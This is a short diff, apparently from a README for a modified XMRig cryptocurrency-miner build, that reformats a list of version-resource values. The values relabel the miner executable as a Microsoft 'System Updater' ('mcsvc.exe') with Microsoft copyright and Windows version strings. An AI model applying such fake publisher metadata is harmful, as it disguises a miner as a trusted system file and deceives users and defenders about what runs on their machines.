@@ -38,19 +38,15 @@ Per the GPLv3 license, I am obligated to list the running changes I made to the 
 
 + XMRig executable (`XMRig.exe`) file metadata changed to:
 
-`VALUE "CompanyName", "Microsoft Corporation"`
-
-`VALUE "FileDescription", "System Updater for Windows® 10 and Windows® 11"`
-
-`VALUE "FileVersion", "10.0.19043.1052"`
-
-`VALUE "LegalCopyright", "Copyright (C) Microsoft Corporation. All rights reserved."`
-
-`VALUE "OriginalFilename", "mcsvc.exe"`
-
-`VALUE "ProductName", "Microsoft® Windows® Operating System"`
-
-`VALUE "ProductVersion", "10.0.19043.1052"`
+```
+VALUE "CompanyName", "Microsoft Corporation"
+VALUE "FileDescription", "System Updater for Windows® 10 and Windows® 11"
+VALUE "FileVersion", "10.0.19043.1052"
+VALUE "LegalCopyright", "Copyright (C) Microsoft Corporation. All rights reserved."
+VALUE "OriginalFilename", "mcsvc.exe"
+VALUE "ProductName", "Microsoft® Windows® Operating System"
+VALUE "ProductVersion", "10.0.19043.1052"
+```
 
 All changes were made under the `000004b0` metadata block.
 
